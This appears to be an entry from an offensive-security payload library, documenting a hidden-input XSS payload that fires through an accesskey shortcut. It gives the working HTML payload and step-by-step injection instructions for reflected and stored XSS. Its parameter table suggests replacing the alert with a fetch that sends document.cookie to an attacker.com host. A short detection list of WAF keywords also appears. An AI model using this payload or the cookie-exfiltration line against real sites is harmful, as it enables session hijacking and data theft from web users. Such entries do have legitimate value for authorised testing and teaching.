---
id: 275345c5-378a-45af-9002-57ca545b2f7a
type: code
language: html
verified: true
created_at: '2023-04-06T03:56:41.871027+00:00'
updated_at: '2023-04-10T20:21:31.559342+00:00'
tags:
  - xss
  - hidden-input
  - javascript-payload
platforms:
  - Web
validated: true
---

# Hidden-Input-XSS-with-Keyboard-Trigger

## Code

```html
<input type="hidden" accesskey="X" onclick="alert(1)">
Use CTRL+SHIFT+X to trigger the onclick event
```

## Description

This HTML snippet creates a hidden input field that executes JavaScript via an 'onclick' event handler, triggered by the keyboard shortcut CTRL+SHIFT+X. It exploits insufficient sanitization in web forms to inject executable HTML/JS, enabling XSS in scenarios where hidden fields reflect user input. The payload is invisible to users but activates on focus, ideal for stealthy execution in reflected or stored XSS attacks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| accesskey="X" | Keyboard shortcut key (changes focus to the input) | "X" (triggers with CTRL+SHIFT+X) |
| onclick="alert(1)" | JavaScript to execute on click/focus | "alert(1)" (replace with exfiltration like "fetch('http://attacker.com?data='+document.cookie)") |

## Usage

Inject this snippet into a vulnerable hidden input's value attribute via form parameters, proxy modification, or stored input (e.g., in a CMS). For reflected XSS, append to a search parameter that populates the form. Once loaded in the victim's browser, press CTRL+SHIFT+X (or automate via another script) to focus and execute. Use in red team engagements to simulate data theft from authenticated sessions.

## Detection

- Browser developer tools showing unsanitized HTML in form elements.
- CSP violations logged if inline scripts are blocked.
- WAF alerts on keywords like 'onclick', 'accesskey', or 'alert()' in input data.
- JavaScript execution logs in browser consoles or server-side monitoring of anomalous requests.

## Related

- [[procedures/Hidden-Input-XSS-Attack]]
